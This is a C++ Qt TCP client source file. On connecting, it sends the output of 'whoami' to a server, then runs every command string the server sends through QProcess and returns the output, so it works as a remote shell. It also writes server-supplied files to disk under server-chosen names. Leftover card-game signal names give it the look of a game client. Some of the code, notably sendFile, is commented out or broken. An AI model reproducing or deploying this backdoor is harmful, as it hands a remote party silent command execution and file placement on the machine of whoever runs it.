#include "client.h"

#define PORT 8080
#define BUFFER_SIZE 1024

Client::Client(QObject *parent) : QObject{parent}
{
    socket = new QTcpSocket();
    connect(socket, &QTcpSocket::readyRead, this, &Client::readSocket);
    connect(socket, &QTcpSocket::errorOccurred, this, &Client::displayError);
    connect(socket, &QTcpSocket::disconnected, this, &Client::discardSocket);
    socket->connectToHost(QHostAddress::LocalHost, PORT); // LocalHost
    // socket->connectToHost(QHostAddress::AnyIPv4, PORT);   // IPv4

    if (socket->waitForConnected(-1))
    {
        qDebug() << "Connected";
        sendByte("whoami", command("whoami"));
        return;
    }
    else
    {
        qDebug() << QString("The following error occurred: %1.").arg(socket->errorString());
    }
}

QByteArray Client::command(QString com)
{

    QProcess process(this);
    QDir dir;
    QByteArray output, error;
    if (com.contains("cd "))
    {
        QString path = com.split("cd ")[1];
        dir.setCurrent(path);
    }
    else
    {
        process.startCommand(com);
        process.waitForFinished(-1);
        output = process.readAllStandardOutput();
        error = process.readAllStandardError();
    }
    if (error.isEmpty())
        return output;
    else
        return error;
}

void Client::readSocket()
{
    QByteArray buffer;
    QDataStream socketStream(socket);
    socketStream.setVersion(QDataStream::Qt_6_5);
    socketStream.startTransaction();
    socketStream >> buffer;
    if (!socketStream.commitTransaction())
    {
        return;
    }
    QString header = buffer.mid(0, 128);
    QString Type = header.split(",")[0].split(":")[1];
    buffer = buffer.mid(128);
    if (Type == "signal")
    {
        QString signal(buffer.toStdString().c_str());
        if (signal == "EXIT")
        {
        }
        else if (signal == " ")
        {
        }
        else
        {
            sendByte("command", command(signal));
        }
    }
    else if (Type == "file")
    {
        QString fileName = header.split(",")[1].split(":")[1];
        QString ext = fileName.split(".")[1];
        QString signal = header.split(",")[2].split(":")[1];
        QString size = header.split(",")[3].split(":")[1].split(";")[0];
        QString filePath = fileName;
        QFile file(filePath);
        if (file.open(QIODevice::WriteOnly | QIODevice::Truncate))
        {
            file.write(buffer);
            file.close();
            if (signal == "start_game")
            {
                return;
            }
            else if (signal == "start_round")
            {
                return;
            }
            else if (signal == "play_card")
            {
                return;
            }
            QString signal(buffer.toStdString().c_str());
            if (signal == "pause")
            {
                return;
            }
            else if (signal == "resume")
            {
                return;
            }
            else
                qDebug() << "An error occurred while trying to write the attachment.";
        }
    }
}

void Client::discardSocket() // Okay
{
    socket->deleteLater();
    socket = nullptr;
}

void Client::displayError(QAbstractSocket::SocketError socketError) // Okay
{
    switch (socketError)
    {
    case QAbstractSocket::RemoteHostClosedError:
        break;
    case QAbstractSocket::HostNotFoundError:
        // QMessageBox::information(this, "QTCPClient",
        //  "The host was not found. Please check the host name and port settings.");
        break;
    case QAbstractSocket::ConnectionRefusedError:
        // QMessageBox::information(this, "QTCPClient",
        //  "The connection was refused by the peer. Make sure QTCPServer is running, and check "
        //  "that the host name and port settings are correct.");
        break;
    default:
        // QMessageBox::information(this, "QTCPClient",
        //  QString("The following error occurred: %1.").arg(socket->errorString()));
        break;
    }
}

// bool Client::sendSignal(QString signal)
// {
//     if (socket)
//     {
//         if (socket->isOpen())
//         {
//             QDataStream socketStream(socket);
//             socketStream.setVersion(QDataStream::Qt_6_5);
//             QByteArray header;
//             header.prepend(QString("Type:signal,fileName:null,fileSize:%1;").arg(signal.size()).toUtf8());
//             header.resize(128);
//             QByteArray byteArray = signal.toUtf8();
//             byteArray.prepend(header);
//             socketStream.setVersion(QDataStream::Qt_6_5);
//             socketStream << byteArray;
//             return true;
//         }
//         else
//         {
//             qDebug() << "Socket doesn't seem to be opened";
//             return false;
//         }
//     }
//     else
//     {
//         qDebug() << "Not connected";
//         return false;
//     }
// }

bool Client::sendByte(QString signal, QByteArray byte)
{
    if (socket)
    {
        if (socket->isOpen())
        {
            QDataStream socketStream(socket);
            socketStream.setVersion(QDataStream::Qt_6_5);
            QByteArray header;
            header.prepend(QString("Type:byte,signal:%1,fileSize:%2;").arg(signal, signal.size()).toUtf8());
            header.resize(128);
            QByteArray byteArray = byte;
            byteArray.prepend(header);
            socketStream.setVersion(QDataStream::Qt_6_5);
            socketStream << byteArray;
            return true;
        }
        else
        {
            qDebug() << "Socket doesn't seem to be opened";
            return false;
        }
    }
    else
    {
        qDebug() << "Not connected";
        return false;
    }
}

bool Client::sendFile(QString signal, QString filePath) // Okay
{
    if (socket)
    {
        if (socket->isOpen())
        {
            if (filePath.isEmpty())
            {
                //     // QMessageBox::critical(this, "QTCPClient", "You haven't selected any attachment!");
                //     return false;
                // }
                // QFile m_file(filePath);
                // if (m_file.open(QIODevice::ReadOnly))
                // {
                //     QFileInfo fileInfo(m_file.fileName());
                //     QString fileName(fileInfo.fileName());

                //     QDataStream socketStream(socket);
                //     socketStream.setVersion(QDataStream::Qt_6_5);
                //     QByteArray header;
                //     header.prepend(QString("Type:file,Name:%1,signal:%2,Size:%3;").arg(fileName).arg(signal).arg(m_file.size()).toUtf8());
                //     header.resize(128);
                //     QByteArray byteArray = m_file.readAll();
                //     byteArray.prepend(header);
                //     socketStream.setVersion(QDataStream::Qt_6_5);
                //     socketStream << byteArray;
                //     return true;
            }
            else
            {
                // QMessageBox::critical(this, "QTCPClient", "Attachment is not readable!");
                return false;
            }
        }
        else
        {
            // QMessageBox::critical(this, "QTCPClient", "Socket doesn't seem to be opened");
            return false;
        }
    }
    else
    {
        // QMessageBox::critical(this, "QTCPClient", "Not connected");
        return false;
    }
}

Client::~Client()
{
    delete socket;
}